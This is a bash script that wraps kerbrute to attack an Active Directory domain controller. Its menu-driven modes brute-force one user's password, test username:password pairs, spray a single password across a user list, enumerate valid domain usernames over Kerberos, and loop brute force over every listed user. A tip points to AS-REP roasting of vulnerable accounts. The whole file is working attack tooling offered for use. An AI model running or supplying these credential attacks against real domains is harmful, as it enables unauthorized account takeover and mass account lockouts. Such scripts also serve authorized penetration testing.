#!/bin/bash

line="\n============================================================\n"
target=""
dom=""
username=""
passwd=""
user_list=""
pass_list=""
cred_list=""
mode=""

Help()
{
cat <<EOF
[Options]
	-h: Display this help menu
	-i <IP_ADDRESS>: The target Domain Controller's IP Address
	-d <DOMAIN>: The target's domain (e.g. xample.local)
	-u <USERNAME>: Specify a username [bruteuser]
	-p <PASSWORD>: Specify a password [passwordspray]
	-U <USER_LIST>: Specify a wordlist for usernames
	-P <PASS_LIST>: Specify a wordlist for passwords
	-c <CRED_LIST>: Specify a wordlist of colon seperated credentials [credpairs]
	-x <MODE>: Specify the operation to perform

[Modes]
	bu: (bruteuser) Bruteforce a single user's password from a wordlist
	cred: (credpairs) Read username:password combos from a file
	spray: (passwordspray) Test a single password against a list of users
	enum: (userenum) Enumerate valid domain usernames via Kerberos
	bf: (bruteforce) Bruteforce usenames & passwords

[!] Tip: Kerbrute can lockout accounts depending on target's configuration
EOF
exit 0
}

while getopts ":hi:d:u:p:U:P:c:x:" option; do
  case $option in
    h)
      Help
      ;;
    i)
      target="$OPTARG"
      ;;
    d)
      dom="$OPTARG"
      ;;
    u)
      username="$OPTARG"
      ;;
    p)
      passwd="$OPTARG"
      ;;
    U)
      user_list="$OPTARG"
      ;;
    P)
      pass_list="$OPTARG"
      ;;
    c)
      cred_list="$OPTARG"
      ;;
    x)
      mode="$OPTARG"
      ;;
  esac
done

if [[ -z "$target" ]]; then
  echo -e "\nEnter target IP / hostname:\n"
  read target
fi

if [[ -z "$dom" ]]; then
  echo -e "\nSpecify the domain (e.g. xample.local):\n"
  read dom
fi

if [[ -z "$mode" ]]; then
  cat << EOF
Select the operation to perform:

[1] bruteuser - Bruteforce a single user's password from a wordlist
[2] credpairs - Read username:password combos from a file
[3] passwordspray - Test a single password against a list of users
[4] userenum - Enumerate valid domain usernames via Kerberos
[5] bruteforce - Bruteforce usenames & passwords

[!] Tip: Kerbrute can lockout accounts depending on target's configuration

EOF
  read mode
fi

case "$mode" in
  bu|1)
    if [[ -z "$pass_list" ]]; then
      echo -e "\nEnter the file path for the password wordlist:\n"
      read pass_list
    fi

    if [[ -z "$username" ]]; then
      echo -e "\nEnter the username to Bruteforce\n"
      read username
    fi

    kerbrute bruteuser -d "$dom" --dc "$target" "$pass_list" "$username"
    ;;
  cred|2)
    if [[ -z "$cred_list" ]]; then
      echo -e "\nEnter the file path for the credential wordlist (The format is username:password):\n"
      read cred_list
    fi

    kerbrute bruteforce -d "$dom" --dc "$target" "$cred_list"
    ;;
  spray|3)
    if [[ -z "$passwd" ]]; then
      echo -e "\nSpecify the password to spray:\n"
      read passwd
    fi

    if [[ -z "$user_list" ]]; then
      echo -e "\nSpecify the file path to the username wordlist:\n"
      read user_list
    fi

    kerbrute passwordspray -d "$dom" --dc "$target" "$user_list" "$passwd"
    ;;
  enum|4)
    if [[ -z "$user_list" ]]; then
      echo -e "\nSpecify the file path to the username wordlist:\n"
      read user_list
    fi

    echo -e "$line\n[!] Tip: kerbrute performs ASREP Roasting on vuln accounts, but the hash *isn't* in a crackable format for john. ASREP Roast with Ares instead.\n$line"

    kerbrute userenum -d "$dom" --dc "$target" "$user_list"
    ;;
  bf|5)
    if [[ -z "$user_list" ]]; then
      echo -e "\nSpecify the file path to the username wordlist:\n"
      read user_list
    fi

    if [[ -z "$pass_list" ]]; then
      echo -e "\nEnter the file path for the password wordlist:\n"
      read pass_list
    fi

    while IFS= read -r u; do
      kerbrute bruteuser -d "$dom" --dc "$target" "$pass_list" "$u"
      echo -e "$line"
    done < "$user_list"
    ;;
  *)
    echo -e "\nYou did not select a valid option\n"
    Help
    ;;
esac
